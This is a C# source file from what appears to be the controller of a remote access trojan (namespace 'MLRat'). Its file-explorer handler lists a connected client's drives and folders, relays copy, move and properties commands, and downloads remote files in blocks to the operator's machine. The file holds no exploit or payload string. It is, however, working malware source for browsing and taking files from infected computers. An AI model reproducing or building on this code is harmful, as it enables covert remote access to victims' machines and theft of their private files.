using MLManagementServer.CustomObjects;
using MLManagementServer.Forms;
using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLManagementServer.Handlers
{
    public static class FileExplorerHandler
    {
        static Dictionary<Guid, FileExplorerForm> FormHandler = new Dictionary<Guid, FileExplorerForm>();
        static IServerUIHandler UIHost = null;
        private static Dictionary<string, DownloadingFileInfo> DownloadHandler = new Dictionary<string, DownloadingFileInfo>();
        public static void SetUIHost(IServerUIHandler handler)
        {
            UIHost = handler;
        }

        public static void ContextCallback(IClient[] clients)
        {
            foreach(IClient c in clients)
            {
                Start(c);
            }
        }

        public static void Disconnect(IClient c)
        {
            if(FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].Close();
            }
        }

        public static void StartDownload(IClient c, string remotePath)
        {
            try
            {
                string downloadLocation = string.Empty;
                using (SaveFileDialog sfd = new SaveFileDialog())
                {
                    sfd.FileName = Path.GetFileName(remotePath);
                    if (sfd.ShowDialog() != DialogResult.OK)
                        return;
                    downloadLocation = sfd.FileName;
                }

                string id = Guid.NewGuid().ToString("n");
                while (DownloadHandler.ContainsKey(id))
                    id = Guid.NewGuid().ToString("n");

                FileStream fs = new FileStream(downloadLocation, FileMode.Create, FileAccess.Write);
                DownloadingFileInfo dfi = new DownloadingFileInfo();
                dfi.DownloadLocation = downloadLocation;
                dfi.Stream = fs;
                DownloadHandler.Add(id, dfi);
                c.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.StartDownload, id, remotePath);
            }
            catch
            {
                MessageBox.Show("Failed to start download");
            }
        }

        public static void Handle(IClient c, object[] data)
        {
            FileManagerCommand command = (FileManagerCommand)data[1];
            if (command == FileManagerCommand.DownloadInvalid)
            {
                string downloadHandle = (string)data[2];
                if (!DownloadHandler.ContainsKey(downloadHandle))
                    return;
                MessageBox.Show("Download is invalid: \n" + (string)data[3]);
                DownloadHandler[downloadHandle].Stream.Close();
                DownloadHandler[downloadHandle].Stream.Dispose();
                DownloadHandler.Remove(downloadHandle);
            }

            if (command == FileManagerCommand.DownloadBlock)
            {
                string downloadHandle = (string)data[2];
                if (!DownloadHandler.ContainsKey(downloadHandle))
                    return;
                byte[] block = (byte[])data[3];
                bool finalBlock = (bool)data[4];
                DownloadHandler[downloadHandle].Stream.Write(block, 0, block.Length);
                if (finalBlock)
                {
                    DownloadHandler[downloadHandle].Stream.Close();
                    DownloadHandler[downloadHandle].Stream.Dispose();
                    DownloadHandler[downloadHandle].Stream = null;
                    MessageBox.Show(string.Format("Download Complete!\nLocation: {0}", DownloadHandler[downloadHandle].DownloadLocation));
                    DownloadHandler.Remove(downloadHandle);
                }
            }
            if (FormHandler.ContainsKey(c.ID))
            {
                Console.WriteLine("FM: {0}", command.ToString());
                if (command == FileManagerCommand.CopyResponce) FormHandler[c.ID].HandleCopyResponce((Guid)data[2], (bool)data[3]);
                if (command == FileManagerCommand.MoveResponce) FormHandler[c.ID].HandleMoveResponce((Guid)data[2], (bool)data[3]);
                if (command == FileManagerCommand.PropertiesResponce) FormHandler[c.ID].HandleProperties(data);

                if (command == FileManagerCommand.DriveResponce)
                {
                    string[] drives = (string[])data[2];
                    string[] driveSizes = (string[])data[3];
                    string[] driveLabels = (string[])data[4];

                    FormHandler[c.ID].BeginUpdate(false, string.Empty);

                    for (int i = 0; i < drives.Length; i++)
                    {
                        FormHandler[c.ID].AddDrive(drives[i], driveSizes[i], driveLabels[i]);
                    }
                        
                }
                if (command == FileManagerCommand.DirectoryResponce)
                {
                    string[] folders = (string[])data[2];
                    bool[] folderEmpty = (bool[])data[3];
                    string[] files = (string[])data[4];
                    string[] filesizes = (string[])data[5];

                    FormHandler[c.ID].BeginUpdate(true, (string)data[6]);

                    for (int i = 0; i < folders.Length; i++)
                    {
                        FormHandler[c.ID].AddDirectory(folders[i], folderEmpty[i]);
                    }
                        
                    for (int i = 0; i < files.Length; i++)
                    {
                        FormHandler[c.ID].AddFile(files[i], filesizes[i]);
                    }
                        
                }
                if(command == FileManagerCommand.Invalid)
                {
                    FormHandler[c.ID].BeginUpdate(true, (string)data[3]);
                    FormHandler[c.ID].InvalidDirectory((string)data[2]);
                }
            }
        }

        public static void Start(IClient c)
        {
            if (!FormHandler.ContainsKey(c.ID))
            {
                FileExplorerForm form = new FileExplorerForm(UIHost, c);
                form.Text = string.Format("File Explorer ({0})", c.GetVariable<string>("Username", ""));
                form.FormClosed += Form_FormClosed; ;
                FormHandler.Add(c.ID, form);
                form.Show();
            }
        }

        private static void Form_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
        {
            FileExplorerForm form = (FileExplorerForm)sender;
            if (FormHandler.ContainsKey(form.Client.ID))
            {
                FormHandler.Remove(form.Client.ID);
            }
            form.Dispose();
        }
    }
}
